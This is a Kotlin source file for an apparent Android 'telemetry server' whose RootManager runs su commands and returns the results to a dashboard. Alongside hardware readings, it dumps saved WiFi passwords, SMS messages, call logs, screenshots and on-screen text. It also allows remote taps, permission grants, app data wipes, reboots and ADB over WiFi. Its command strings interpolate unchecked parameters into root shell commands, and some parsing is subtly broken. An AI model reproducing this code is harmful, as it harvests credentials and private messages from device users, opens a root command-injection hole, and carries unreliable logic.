package com.irfanfrizki.telemetry.server

import android.content.Context
import android.os.Build
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

/**
 * Root detection and privileged command execution.
 * All su commands run on background thread with timeout.
 * Results are cached; not called on every poll.
 */
object RootManager {

    private const val TAG = "RootManager"
    private const val SU_TIMEOUT_MS = 5000L

    // Cache for root status (avoid repeated su calls)
    @Volatile private var cachedRootStatus: RootStatus? = null
    @Volatile private var rootStatusCheckedAt = 0L
    private const val ROOT_STATUS_CACHE_MS = 30_000L // 30 detik

    enum class RootStatus {
        NONE,           // Tidak ada root / su tidak ditemukan
        GENERIC_SU,     // su binary ada tapi bukan Magisk (lineage, dll)
        MAGISK_GRANTED, // Magisk terdeteksi dan su -c id berhasil (uid=0)
        MAGISK_DENIED   // Magisk terdeteksi tapi su ditolak (belum diminta izin / dicabut)
    }

    /** Cek status root (dengan cache 30 detik). */
    fun checkRootStatus(context: Context): RootStatus {
        val now = System.currentTimeMillis()
        if (cachedRootStatus != null && now - rootStatusCheckedAt < ROOT_STATUS_CACHE_MS) {
            return cachedRootStatus!!
        }
        val status = computeRootStatus(context)
        cachedRootStatus = status
        rootStatusCheckedAt = now
        return status
    }

    /** Paksa cek ulang (mis. setelah user beri izin di Magisk). */
    fun forceRecheck(context: Context): RootStatus {
        cachedRootStatus = null
        rootStatusCheckedAt = 0
        return checkRootStatus(context)
    }

    private fun computeRootStatus(context: Context): RootStatus {
        val suPaths = arrayOf(
            "/system/bin/su", "/system/xbin/su", "/sbin/su",
            "/system/sbin/su", "/vendor/bin/su", "/su/bin/su",
            "/data/adb/magisk/su", "/magisk/.core/bin/su"
        )

        val hasSuBinary = suPaths.any { File(it).exists() && File(it).canExecute() }
        if (!hasSuBinary) return RootStatus.NONE

        // Cek Magisk
        val isMagisk = isMagiskInstalled(context) ||
            File("/data/adb/magisk").exists() ||
            File("/magisk").exists()

        // Coba jalankan su -c id (timeout 5 detik)
        val hasRootAccess = executeRootCommand("id")?.contains("uid=0") == true

        return when {
            isMagisk && hasRootAccess -> RootStatus.MAGISK_GRANTED
            isMagisk -> RootStatus.MAGISK_DENIED
            hasRootAccess -> RootStatus.GENERIC_SU
            else -> RootStatus.NONE
        }
    }

    private fun isMagiskInstalled(context: Context): Boolean {
        return try {
            context.packageManager.getPackageInfo("com.topjohnwu.magisk", 0)
            true
        } catch (_: Exception) {
            false
        }
    }

    /** Jalankan perintah root di thread terpisah, kembalikan output (trimmed) atau null jika gagal/timeout. */
    fun executeRootCommand(cmd: String): String? {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
            val output = process.inputStream.bufferedReader().use { it.readText() }
            val finished = process.waitFor(SU_TIMEOUT_MS, java.util.concurrent.TimeUnit.MILLISECONDS)
            if (!finished) {
                process.destroyForcibly()
                Log.w(TAG, "su -c timeout: $cmd")
                return null
            }
            output.trim()
        } catch (e: Exception) {
            Log.w(TAG, "su -c failed: $cmd", e)
            null
        }
    }

    /** Jalankan banyak perintah root sekaligus (satu su session), return map cmd->output. */
    fun executeRootCommands(cmds: Array<String>): Map<String, String?> {
        val script = cmds.joinToString("\n")
        val output = executeRootCommand(script)
        if (output == null) return cmds.associateWith { null }
        // Output gabungan, parse per baris (asumsi output per command 1 baris)
        val lines = output.lines().toList()
        return cmds.mapIndexed { i, c -> c to lines.getOrNull(i)?.trim() }.toMap()
    }

    /** Data root untuk dikirim ke dashboard (JSON). */
    fun getRootInfo(context: Context): JSONObject {
        val status = checkRootStatus(context)
        return JSONObject().apply {
            put("available", status != RootStatus.NONE)
            put("status", status.name)
            put("isMagisk", status == RootStatus.MAGISK_GRANTED || status == RootStatus.MAGISK_DENIED)
            put("hasAccess", status == RootStatus.MAGISK_GRANTED || status == RootStatus.GENERIC_SU)
        }
    }

    // ===== Root-only data collection =====

    /** Screenshot via screencap -p (return base64 PNG). */
    fun takeScreenshot(): String? {
        val output = executeRootCommand("screencap -p")
        return output?.let { android.util.Base64.encodeToString(it.toByteArray(), android.util.Base64.NO_WRAP) }
    }

    /** Aplikasi foreground akurat via dumpsys window/activity. */
    fun getForegroundApp(): JSONObject? {
        val output = executeRootCommand("dumpsys window windows | grep -E 'mCurrentFocus|mFocusedApp' | head -1")
        val output2 = executeRootCommand("dumpsys activity top | grep -E 'ACTIVITY|Package' | head -3")
        val combined = "${output ?: ""}\n${output2 ?: ""}".trim()
        return if (combined.isNotBlank()) {
            JSONObject().put("raw", combined)
        } else null
    }

    /** UI dump (teks di layar) via uiautomator. */
    fun getUiDump(): String? {
        val tmpFile = "/data/local/tmp/uidump.xml"
        val cmd = "rm -f $tmpFile; uiautomator dump $tmpFile; cat $tmpFile"
        return executeRootCommand(cmd)
    }

    /** Daftar proses lengkap dengan RAM/CPU per aplikasi. */
    fun getProcessList(): JSONArray {
        val output = executeRootCommand("ps -A -o pid,ppid,user,pcpu,pmem,comm,args | head -50")
        val arr = JSONArray()
        output?.lines()?.forEach { line ->
            if (line.isNotBlank() && !line.startsWith("PID")) {
                arr.put(line.trim())
            }
        }
        return arr
    }

    /** Memori per paket via dumpsys meminfo. */
    fun getMemInfo(pkg: String): JSONObject? {
        val output = executeRootCommand("dumpsys meminfo $pkg")
        return output?.let { JSONObject().put("raw", it) }
    }

    /** Baterai: arus (current_now) dari /sys/class/power_supply/battery/. */
    fun getBatteryCurrent(): JSONObject {
        val currentNow = readSysFile("/sys/class/power_supply/battery/current_now")
        val currentAvg = readSysFile("/sys/class/power_supply/battery/current_average")
        val voltageNow = readSysFile("/sys/class/power_supply/battery/voltage_now")
        val capacityNow = readSysFile("/sys/class/power_supply/battery/capacity")
        val capacityDesign = readSysFile("/sys/class/power_supply/battery/charge_full_design")
        val capacityFull = readSysFile("/sys/class/power_supply/battery/charge_full")
        val cycleCount = readSysFile("/sys/class/power_supply/battery/cycle_count")
        val health = readSysFile("/sys/class/power_supply/battery/health")
        val status = readSysFile("/sys/class/power_supply/battery/status")
        val temp = readSysFile("/sys/class/power_supply/battery/temp")
        val technology = readSysFile("/sys/class/power_supply/battery/technology")

        return JSONObject().apply {
            // current_now biasanya dalam µA, ubah ke mA
            currentNow?.let { put("currentMa", (it.toLong() / 1000)) }
            currentAvg?.let { put("currentAvgMa", (it.toLong() / 1000)) }
            voltageNow?.let { put("voltageMv", it.toLong()) }
            capacityNow?.let { put("level", it.toInt()) }
            capacityDesign?.let { put("designCapacityMah", (it.toLong() / 1000)) }
            capacityFull?.let { put("fullCapacityMah", (it.toLong() / 1000)) }
            cycleCount?.let { put("cycleCount", it.toLong()) }
            health?.let { put("healthRaw", it) }
            status?.let { put("statusRaw", it) }
            temp?.let { put("tempC", (it.toDouble() / 10)) }
            technology?.let { put("technology", it) }
        }
    }

    /** Suhu semua sensor thermal. */
    fun getThermalSensors(): JSONArray {
        val base = File("/sys/class/thermal")
        if (!base.exists()) return JSONArray()
        val arr = JSONArray()
        base.listFiles()?.filter { it.name.startsWith("thermal_zone") }?.sortedBy { it.name }?.forEach { zone ->
            val tempFile = File(zone, "temp")
            val typeFile = File(zone, "type")
            val temp = readSysFile(tempFile.absolutePath)
            val type = readSysFile(typeFile.absolutePath)
            temp?.let {
                arr.put(JSONObject().apply {
                    put("zone", zone.name)
                    put("type", type ?: "unknown")
                    put("tempC", String.format("%.1f", it.toDouble() / 1000))
                })
            }
        }
        return arr
    }

    /** CPU: frekuensi, governor, beban per core. */
    fun getCpuDetails(): JSONObject {
        val cores = Runtime.getRuntime().availableProcessors()
        val freqArr = JSONArray()
        val governorArr = JSONArray()

        for (i in 0 until cores) {
            val base = "/sys/devices/system/cpu/cpu$i/cpufreq/"
            val cur = readSysFile(base + "scaling_cur_freq")?.toLongOrNull()
            val max = readSysFile(base + "cpuinfo_max_freq")?.toLongOrNull() ?: readSysFile(base + "scaling_max_freq")?.toLongOrNull()
            val min = readSysFile(base + "cpuinfo_min_freq")?.toLongOrNull() ?: readSysFile(base + "scaling_min_freq")?.toLongOrNull()
            val gov = readSysFile(base + "scaling_governor")

            freqArr.put(JSONObject().apply {
                put("core", i)
                cur?.let { put("curMhz", it / 1000) }
                max?.let { put("maxMhz", it / 1000) }
                min?.let { put("minMhz", it / 1000) }
            })
            governorArr.put(JSONObject().apply {
                put("core", i)
                put("governor", gov ?: "unknown")
            })
        }

        // CPU load dari /proc/stat (akurat)
        val procStat = readProcStat()
        val loadAvg = readSysFile("/proc/loadavg")?.split(" ")?.firstOrNull()?.toDoubleOrNull()

        return JSONObject().apply {
            put("cores", cores)
            put("frequencies", freqArr)
            put("governors", governorArr)
            put("loadAvg1m", loadAvg)
            procStat?.let { (total, idle) ->
                put("procTotal", total)
                put("procIdle", idle)
            }
        }
    }

    /** GPU freq (jika tersedia). */
    fun getGpuFreq(): JSONObject? {
        val paths = listOf(
            "/sys/class/kgsl/kgsl-3d0/devfreq/cur_freq",
            "/sys/class/devfreq/gpu/cur_freq",
            "/sys/devices/platform/gpu/devfreq/cur_freq"
        )
        paths.forEach { path ->
            val v = readSysFile(path)?.toLongOrNull()
            if (v != null && v > 0) {
                return JSONObject().put("gpuFreqMhz", v / 1_000_000)
            }
        }
        return null
    }

    /** Koneksi jaringan aktif (TCP/UDP) dari /proc/net/tcp*. */
    fun getNetworkConnections(): JSONArray {
        val arr = JSONArray()
        listOf("/proc/net/tcp", "/proc/net/tcp6", "/proc/net/udp", "/proc/net/udp6").forEach { path ->
            val lines = File(path).readText().lines()
            if (lines.size > 1) {
                lines.drop(1).take(20).forEach { line ->
                    val parts = line.trim().split("\\s+")
                    if (parts.size >= 10) {
                        arr.put(JSONObject().apply {
                            put("proto", path.substringAfterLast("/"))
                            put("local", parseHexAddr(parts[1]))
                            put("remote", parseHexAddr(parts[2]))
                            put("state", parts[3])
                            put("uid", parts[7])
                        })
                    }
                }
            }
        }
        return arr
    }

    /** Tabel ARP. */
    fun getArpTable(): JSONArray {
        val output = executeRootCommand("cat /proc/net/arp")
        val arr = JSONArray()
        output?.lines()?.drop(1)?.forEach { line ->
            val parts = line.trim().split("\\s+")
            if (parts.size >= 6) {
                arr.put(JSONObject().apply {
                    put("ip", parts[0])
                    put("hwType", parts[1])
                    put("flags", parts[2])
                    put("mac", parts[3])
                    put("mask", parts[4])
                    put("device", parts[5])
                })
            }
        }
        return arr
    }

    /** Password WiFi tersimpan (butuh root baca /data/misc/wifi/). */
    fun getSavedWifiPasswords(): JSONArray {
        val output = executeRootCommand("cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null | grep -A2 -B2 'PreSharedKey'")
        val arr = JSONArray()
        output?.let { arr.put(JSONObject().put("raw", it)) }
        return arr
    }

    /** Statistik data per aplikasi (UID-based) via /proc/net/xt_qtaguid/stats. */
    fun getUidNetworkStats(): JSONArray {
        val output = executeRootCommand("cat /proc/net/xt_qtaguid/stats 2>/dev/null | head -30")
        val arr = JSONArray()
        output?.lines()?.drop(1)?.forEach { line ->
            val parts = line.trim().split("\\s+")
            if (parts.size >= 8) {
                arr.put(JSONObject().apply {
                    put("uid", parts[3])
                    put("rxBytes", parts[5].toLongOrNull())
                    put("txBytes", parts[7].toLongOrNull())
                })
            }
        }
        return arr
    }

    /** Kirim input (tap, swipe, keyevent, text). */
    fun sendInput(cmd: String): Boolean {
        return executeRootCommand("input $cmd") != null
    }

    /** Kontrol aplikasi (am start, am force-stop, pm grant/revoke). */
    fun controlApp(action: String, pkg: String, extra: String = ""): Boolean {
        return when (action) {
            "start" -> executeRootCommand("am start -n $extra") != null
            "force-stop" -> executeRootCommand("am force-stop $pkg") != null
            "grant" -> executeRootCommand("pm grant $pkg $extra") != null
            "revoke" -> executeRootCommand("pm revoke $pkg $extra") != null
            "clear" -> executeRootCommand("pm clear $pkg") != null
            else -> false
        }
    }

    /** Kontrol sistem: screen, wifi, airplane, brightness, volume, reboot. */
    fun controlSystem(action: String, value: String = ""): Boolean {
        return when (action) {
            "screen_on" -> executeRootCommand("input keyevent KEYCODE_WAKEUP") != null
            "screen_off" -> executeRootCommand("input keyevent KEYCODE_SLEEP") != null
            "wifi" -> executeRootCommand("svc wifi ${value.lowercase()}") != null
            "airplane" -> executeRootCommand("settings put global airplane_mode_on ${if (value == "on") 1 else 0}; am broadcast -a android.intent.action.AIRPLANE_MODE --ez state ${value == "on"}") != null
            "brightness" -> executeRootCommand("settings put system screen_brightness $value") != null
            "volume" -> executeRootCommand("media volume --stream 3 --set $value") != null
            "reboot" -> executeRootCommand("reboot") != null
            "adb_wifi_on" -> executeRootCommand("setprop service.adb.tcp.port 5555; stop adbd; start adbd") != null
            "adb_wifi_off" -> executeRootCommand("setprop service.adb.tcp.port -1; stop adbd; start adbd") != null
            else -> false
        }
    }

    /** Data sensitif: call log, SMS, app list dengan ukuran data. */
    fun getCallLog(): JSONArray {
        val output = executeRootCommand("content query --uri content://call_log/calls --projection number,date,duration,type,name --sort 'date DESC' | head -20")
        val arr = JSONArray()
        output?.lines()?.forEach { line ->
            if (line.startsWith("Row:")) arr.put(line.substringAfter("Row: ").trim())
        }
        return arr
    }

    fun getSms(): JSONArray {
        val output = executeRootCommand("content query --uri content://sms --projection address,date,body,type --sort 'date DESC' | head -20")
        val arr = JSONArray()
        output?.lines()?.forEach { line ->
            if (line.startsWith("Row:")) arr.put(line.substringAfter("Row: ").trim())
        }
        return arr
    }

    fun getInstalledAppsWithSize(): JSONArray {
        val output = executeRootCommand("pm list packages -s -U | head -30")
        val arr = JSONArray()
        output?.lines()?.forEach { line ->
            if (line.startsWith("package:")) {
                val pkg = line.substringAfter("package:")
                val sizeOut = executeRootCommand("du -sh /data/data/$pkg 2>/dev/null | cut -f1")
                arr.put(JSONObject().apply {
                    put("package", pkg)
                    put("dataSize", sizeOut ?: "?")
                })
            }
        }
        return arr
    }

    // ===== Helpers =====

    private fun readSysFile(path: String): String? {
        return try { File(path).readText().trim().takeIf { it.isNotBlank() } } catch (_: Exception) { null }
    }

    private fun readProcStat(): Pair<Long, Long>? {
        return try {
            val line = File("/proc/stat").bufferedReader().use { it.readLine() } ?: return null
            val parts = line.trim().split("\\s+")
            if (parts.size < 5 || parts[0] != "cpu") return null
            val nums = parts.drop(1).take(8).map { it.toLong() }
            val idle = nums[3] + nums.getOrElse(4) { 0L }
            Pair(nums.sum(), idle)
        } catch (_: Exception) { null }
    }

    private fun parseHexAddr(s: String): String {
        return try {
            val parts = s.split(":")
            if (parts.size != 2) return s
            val ip = parts[0].chunked(2).reversed().joinToString(".") { it.toInt(16).toString() }
            val port = parts[1].toInt(16)
            "$ip:$port"
        } catch (_: Exception) { s }
    }
}